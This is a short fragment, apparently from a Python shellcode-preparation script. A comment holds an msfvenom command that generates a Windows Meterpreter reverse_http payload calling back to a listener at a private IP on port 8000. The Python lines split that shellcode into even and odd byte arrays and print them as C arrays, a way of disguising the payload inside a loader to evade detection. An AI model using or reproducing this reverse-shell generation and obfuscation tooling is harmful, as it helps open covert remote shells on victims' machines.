...
# msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.190.134 LPORT=8000 -f csharp | tr -d \\n
...
print('#define PAYLOAD_SIZE {0}'.format(str(len(shellcode))))
print('char evens[{0}] = {{{1}}};'.format(str(len(evenArray)),', '.join(hex(x) for x in evenArray)))
print('char odds[{0}] = {{{1}}};'.format(str(len(oddArray)),', '.join(hex(x) for x in oddArray)))
